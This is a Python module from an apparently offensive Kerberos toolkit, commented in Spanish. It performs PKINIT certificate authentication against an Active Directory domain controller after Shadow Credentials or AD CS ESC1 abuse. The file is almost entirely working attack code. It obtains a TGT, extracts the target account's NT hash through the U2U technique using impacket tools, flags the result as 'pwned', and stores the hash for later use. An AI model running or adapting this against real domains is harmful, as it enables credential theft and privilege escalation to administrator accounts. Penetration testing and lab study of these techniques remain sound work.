# scripts/kerberos/credentials/pkinit.py
#
# Técnica: PKINIT — Autenticación Kerberos con Certificado
#
# Fundamento:
#   PKINIT (RFC 4556) extiende Kerberos para permitir autenticación con
#   certificados X.509 en vez de contraseñas/hashes.
#
#   El AS-REQ de PKINIT incluye PA-PK-AS-REQ:
#     - El certificado del cliente (o la clave pública).
#     - Una firma sobre el AS-REQ con la clave privada del cliente.
#     - Opcionalmente: DH/ECDH para establecer una clave de sesión efímera.
#
#   El KDC verifica:
#     1. Que el certificado es válido y fue emitido por una CA de confianza.
#     2. Que el SAN (Subject Alternative Name) del certificado corresponde
#        a una cuenta en AD.
#     3. La firma con la clave privada.
#
#   Uso típico en ataques:
#     - Tras Shadow Credentials: autenticarse con el certificado recién generado.
#     - Tras AD CS ESC1: autenticarse con cert con SAN de admin.
#     - Tras comprometer una CA: autenticar como cualquier usuario.
#
#   U2U (User-to-User) trick:
#     Tras el PKINIT, se puede obtener el NT hash del usuario via un AS-REQ U2U
#     (incluye el TGT en la request) → el KDC responde con el PA-PK-AS-REP que
#     contiene el AS-REP key cifrado con la session key → del que se extrae el
#     NT hash via universalKeyChange. (Implementado en impacket gettgtpkinit.)

from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db
import os


class PKINITScript(BaseScript):
    name = "pkinit"
    description = "Autenticación Kerberos via certificado X.509 (tras Shadow Credentials o AD CS)"

    examples = [
        {"flag": "--cert",
         "desc": "Ruta al fichero PEM con la clave privada (y opcionalmente el certificado)",
         "good": "kerberos --script=pkinit -t 10.129.1.5 -d CORP.LOCAL -u svcSQL --cert /tmp/shadow_svcSQL.pem",
         "bad": "kerberos --script=pkinit ... --cert /tmp/cert.pfx  [usa formato PEM; convierte PFX con: openssl pkcs12 -in cert.pfx -out cert.pem -nodes]"},
        {"flag": "--pfx",
         "desc": "Alternativa a --cert: fichero PKCS#12 (.pfx/.p12) con clave + certificado",
         "good": "kerberos --script=pkinit -t 10.129.1.5 -d CORP.LOCAL -u Administrator --pfx /tmp/admin.pfx",
         "bad": "kerberos --script=pkinit ... --pfx /tmp/admin.pfx --cert /tmp/admin.pem  [no combines --pfx y --cert]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip
        cert_path = kwargs.get("cert")
        pfx_path = kwargs.get("pfx")
        username = self.creds.user

        if not realm: console.print("[red]Falta -d.[/red]"); return
        if not username: console.print("[red]Falta -u.[/red]"); return
        if not cert_path and not pfx_path:
            console.print("[red]Falta --cert o --pfx.[/red]"); return
        if cert_path and pfx_path:
            console.print("[red]No combines --cert y --pfx.[/red]"); return

        if cert_path and not os.path.exists(cert_path):
            console.print(f"[red]No existe: {cert_path}[/red]"); return
        if pfx_path and not os.path.exists(pfx_path):
            console.print(f"[red]No existe: {pfx_path}[/red]"); return

        print_result("KRB", kdc, "info",
                     f"pkinit: autenticando {username}@{realm} con certificado")

        ccache_path, nt = self._pkinit_auth(kdc, realm, username, cert_path, pfx_path)

        if ccache_path:
            os.environ['KRB5CCNAME'] = f'FILE:{ccache_path}'
            print_result("KRB", kdc, "pwned",
                         f"PKINIT exitoso para {username}@{realm}")
            console.print(f"[green]TGT: {ccache_path}[/green]")
            if nt:
                print_result("KRB", kdc, "pwned", f"NT hash: {nt}")
                session_db.save_credential(kdc, username, nt, "hash",
                                            valid=True, source="pkinit")
            console.print(f"  export KRB5CCNAME=FILE:{ccache_path}")
            session_db.save_finding(kdc, "KRB", "pkinit_success",
                                     f"{username}@{realm} → {ccache_path}")

    def _pkinit_auth(self, kdc, realm, username, cert_pem=None, pfx_path=None):
        """
        Autenticación PKINIT via impacket.

        impacket no incluye PKINIT nativo hasta versiones recientes.
        Aquí usamos el método disponible o delegamos a gettgtpkinit externo.
        """
        try:
            # Intentar con impacket PKINIT si está disponible
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal, KerberosTime
            from impacket.krb5.asn1 import AS_REQ
            # impacket >= 0.11 tiene soporte PKINIT via gettgtpkinit module
            import subprocess, sys

            # Convertir PFX a PEM si es necesario
            if pfx_path:
                pem_tmp = pfx_path.replace('.pfx', '_tmp.pem').replace('.p12', '_tmp.pem')
                r = subprocess.run(
                    ['openssl', 'pkcs12', '-in', pfx_path, '-out', pem_tmp,
                     '-nodes', '-passin', 'pass:'],
                    capture_output=True
                )
                if r.returncode != 0:
                    console.print("[red]No se pudo convertir PFX (sin contraseña). "
                                   "Prueba con: openssl pkcs12 -in cert.pfx -out cert.pem -nodes[/red]")
                    return None, None
                cert_pem = pem_tmp

            out_ccache = f"/tmp/pkinit_{username}_{realm}.ccache"

            # Intentar impacket-gettgtpkinit si está instalado
            r = subprocess.run(
                ['impacket-gettgtpkinit', f'{realm.lower()}/{username}',
                 '-cert-pem', cert_pem, out_ccache, '-dc-ip', kdc],
                capture_output=True, text=True
            )

            if r.returncode == 0 and os.path.exists(out_ccache):
                # Extraer NT hash via U2U si gettgtpkinit lo soporta
                nt = self._extract_nt_via_u2u(out_ccache, kdc, realm, username)
                return out_ccache, nt
            else:
                console.print(f"[yellow]impacket-gettgtpkinit: {r.stderr[:200]}[/yellow]")
                console.print("[dim]Instala: pip install impacket[/dim]")
                console.print("[dim]O usa: certipy-ad auth -pfx cert.pfx[/dim]")
                return None, None

        except Exception as e:
            console.print(f"[red]Error PKINIT: {e}[/red]")
            return None, None

    def _extract_nt_via_u2u(self, ccache_path, kdc, realm, username) -> str | None:
        """Extrae NT hash via U2U (User-to-User) tras PKINIT."""
        try:
            import subprocess
            r = subprocess.run(
                ['impacket-getnthash', f'{realm.lower()}/{username}',
                 '-key', ccache_path, '-dc-ip', kdc],
                capture_output=True, text=True
            )
            for line in r.stdout.splitlines():
                if 'Hash NTLM' in line or 'NT hash' in line.lower():
                    return line.split(':')[-1].strip()
        except Exception:
            pass
        return None
